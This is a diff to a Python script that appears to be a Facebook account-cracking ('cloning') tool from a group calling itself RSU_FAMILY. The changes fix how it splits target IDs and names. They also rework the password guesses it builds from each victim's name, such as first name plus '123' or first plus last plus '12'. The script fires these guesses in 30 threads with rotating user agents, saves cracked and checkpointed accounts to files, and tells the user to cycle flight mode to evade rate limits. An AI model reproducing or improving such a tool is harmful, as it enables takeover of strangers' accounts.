@@ -243,7 +243,7 @@ def first():
 	print( '\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] \033[1;96m~Use Flight Mode 5 Second After Every 10 mint~\033[1;0m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0]
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			xz = nmf.split(' ')
 			if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
 				pwv = [nmf, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
@@ -287,20 +287,20 @@ def name2():
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			first,last = nmf.split(' ')[0]
+			first,last = nmf.split(' ')[0],nmf.split(' ')[1]
 			firstl = first.lower()
 			lastl = last.lower()
 			firsts = first.capitalize()
 			lasts = last.capitalize()
-			if len(nmf):
-				if len(firstl+' '+lastl)>=6:
-					pwv = [ nmf ]
+			if len(nmf)>=6:
+				if len(first)>=6:
+					pwv = [firstl+' '+lastl ]
 				elif len(first)<=2:
-					pwv = [ nmf ]
-				elif len(firsts+' '+lasts)>=6:
-					pwv = [ nmf ]
+					pwv = [firsts+' '+lasts ]
+				elif len(firsts)>=3:
+					pwv = [first+last ]
 				else:
-					pwv = [ nmf+'12' ]
+					pwv = [ first+last+'12' ]
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -486,7 +486,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[CRACK] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s\033[1;37m[CRACK] %s/%s \033[1;37m| \033[1;37m[OK] %s \033[1;37m| \033[1;37m[CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -525,7 +525,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[CRACK] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s\033[1;37m[CRACK] %s/%s \033[1;37m| \033[1;37m[OK] %s \033[1;37m|  \033[1;37m[CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -586,8 +586,7 @@ logo = """
 \x1b[1;97m[+] GITHUB.        : KHDFOUNDER   
 \x1b[1;97m[+] TEAM.          :\33[1;42m RSU_FAMILY \33[0m
 \x1b[1;97m[+] VERSION        :\x1b[1;97m 0.1  \x1b[1;97m          
-\x1b[1;97m--------------------------------------------------
-"""
+\x1b[1;97m--------------------------------------------------"""
 class Main:
 	def __init__(self):
 		self.id = []
@@ -598,7 +597,7 @@ class Main:
 		print(logo)
 		print(" \033[1;37m[+]WELCOME IN CLONING MENU")
 		print("\033[1;37m--------------------------------------------------")
-		print(" \033[1;37m[1]\033[0;92m FILE CLONING ")
+		print(" \033[1;37m[1] FILE CLONING ")
 		print(" \033[1;37m[2] FILE CREAT(UNDER WORK)")
 		print(" \033[1;37m[3] PUBLIC ID CLONING(UNDER WORK)")
 		print(" \033[1;37m[4] PAK RENDOM CLONING ")
